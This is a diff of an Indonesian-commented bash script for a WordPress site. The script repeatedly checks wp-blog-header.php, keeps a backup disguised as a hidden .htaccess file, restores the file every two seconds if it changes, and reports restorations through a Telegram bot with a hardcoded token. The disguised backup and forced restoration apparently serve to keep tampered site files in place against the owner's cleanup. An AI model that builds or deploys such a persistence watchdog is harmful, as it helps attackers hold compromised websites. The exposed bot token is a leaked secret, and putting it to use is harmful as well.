@@ -1,13 +1,13 @@
 #!/bin/bash
 
 # Definisikan lokasi file index.php Permissions 755
-INDEX_FILE="/home/u987240298/domains/flyforcoffee.com/public_html/index.php"
+INDEX_FILE="/home/u987240298/domains/flyforcoffee.com/public_html/wp-blog-header.php"
 # Definisikan lokasi folder backup Permissions 755
 BACKUP_FOLDER="/home/u987240298/domains/flyforcoffee.com/public_html/"
 # Buat folder backup jika belum ada
 mkdir -p "$BACKUP_FOLDER"
 # Tentukan nama file backup Permissions 755
-BACKUP_FILE="$BACKUP_FOLDER/.packed-refs"
+BACKUP_FILE="$BACKUP_FOLDER/.htaccess"
 
 # Token dan ID chat Telegram
 TOKEN="7588613295:AAHNs_IOFuLy_weuOoKMPWaGobPMvtz5mp4"
@@ -43,8 +43,8 @@ monitor_file() {
             send_telegram_notification "https://flyforcoffee.com/. File index.php Sudah dikembalikan ke versi backup." # UBAH JADI NAMA FILE/DOMAIN. UBAH JADI NAMA FILE/DOMAIN YG DI KEMBALIKAN
         fi
 
-        # Tunggu 30 detik sebelum pengecekan selanjutnya
-        sleep 180
+        # Tunggu 2 detik sebelum pengecekan selanjutnya
+        sleep 2
     done
 }
 
